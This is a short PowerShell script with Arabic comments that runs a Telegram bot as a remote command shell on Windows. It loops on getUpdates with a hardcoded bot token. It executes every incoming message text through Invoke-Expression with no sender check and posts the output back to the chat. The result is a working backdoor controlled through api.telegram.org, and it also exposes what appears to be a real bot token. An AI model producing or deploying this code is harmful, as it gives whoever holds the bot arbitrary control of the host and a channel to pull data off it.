$token = "8508402230:AAGK5iP1fxc7Dscu5pDmqWkAGLCCYLtKrB0"
$offset = 0
Write-Host "=== Telegram Bot Controller Started ===" -ForegroundColor Green

while ($true) {
    try {
        $url = "https://api.telegram.org/bot$token/getUpdates?offset=$offset&timeout=30"
        $response = Invoke-RestMethod -Uri $url -Method Get
        
        if ($response.ok -and $response.result.Count -gt 0) {
            foreach ($update in $response.result) {
                $offset = $update.update_id + 1
                if ($update.message -and $update.message.text) {
                    $chatId = $update.message.chat.id
                    $command = $update.message.text
                    
                    # تنفيذ الأمر على نظام الويندوز
                    try {
                        $output = Invoke-Expression $command 2>&1 | Out-String
                        if ([string]::IsNullOrWhiteSpace($output)) {
                            $output = "Command executed successfully."
                        }
                    } catch {
                        $output = "Error: $_"
                    }
                    
                    # تقصير النتيجة إذا كانت طويلة جداً لكي يقبلها تليجرام
                    if ($output.Length -gt 4000) {
                        $output = $output.Substring(0, 4000) + "`n[Truncated...]"
                    }
                    
                    # إرسال النتيجة إلى محادثة التليجرام
                    $sendUrl = "https://api.telegram.org/bot$token/sendMessage"
                    $body = @{
                        chat_id = $chatId
                        text = $output
                    }
                    Invoke-RestMethod -Uri $sendUrl -Method Post -Body $body | Out-Null
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 5
    }
    Start-Sleep -Seconds 1
}
